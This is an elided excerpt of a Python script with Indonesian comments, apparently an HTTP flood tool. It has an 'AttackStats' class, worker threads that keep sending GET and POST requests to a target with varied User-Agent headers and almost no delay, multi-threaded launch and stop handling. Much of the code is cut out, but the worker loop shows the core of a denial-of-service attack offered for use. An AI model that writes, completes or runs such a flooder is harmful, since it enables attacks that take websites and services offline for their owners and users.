...
class AttackStats:
        ...
        with self.lock:
            ...
            if self.log_file:
                try:
                    ...
                    print(f"{Colors.RED}Log write error: {e}{Colors.END}")
                    self.log_file = None
    ...
    def close_log(self):
        """Tutup file log dengan penanganan error"""
        if self.log_file:
            try:
                self.log_file.flush()
                self.log_file.close()
            except Exception as e:
                print(f"{Colors.RED}Error closing log file: {e}{Colors.END}")

def worker(stats, target, stop_event):
    """Thread worker yang mengirim request"""
    while not stop_event.is_set():
        try:
            ...
            # Timeout yang lebih pendek untuk perangkat mobile
            timeout = 3 if 'Android' in headers['User-Agent'] else 5
            
            if method == 'GET':
                response = requests.get(target, params=params, headers=headers, timeout=timeout)
                stats.add_request(response.status_code)
            else:
                response = requests.post(target, data=params, headers=headers, timeout=timeout)
                stats.add_request(response.status_code)
                
        except requests.exceptions.RequestException as e:
            # Tangani semua error terkait request
            status_code = 0
            if hasattr(e, 'response') and e.response is not None:
                status_code = e.response.status_code
            stats.add_request(status_code)
        except Exception as e:
            # Tangani semua exception lainnya
            stats.add_request(0)
        finally:
            # Beri jeda kecil untuk mengurangi beban CPU
            time.sleep(0.001)
...
def main():
    ...
    # Handle Ctrl+C secara lebih baik
    stop_event = threading.Event()
    
    def sigint_handler(signum, frame):
        print(f"\n{Colors.RED}🛑 Received interrupt signal. Cleaning up...{Colors.END}")
        cleanup(stop_event, stats)
    ...
    for _ in range(num_threads):
        try:
            ...
            print(f"{Colors.RED}Thread start error: {e}{Colors.END}")
    ...
    try:
        ...
        print(f"{Colors.RED}Display thread error: {e}{Colors.END}")
        stop_event.set()
        cleanup(stop_event, stats)
        return
    ...
    try:
        ...
        print(f"{Colors.RED}Timer error: {e}{Colors.END}")
    finally:
        stop_event.set()
        # Tunggu sebentar agar statistik terakhir bisa ditampilkan
        time.sleep(1.5)
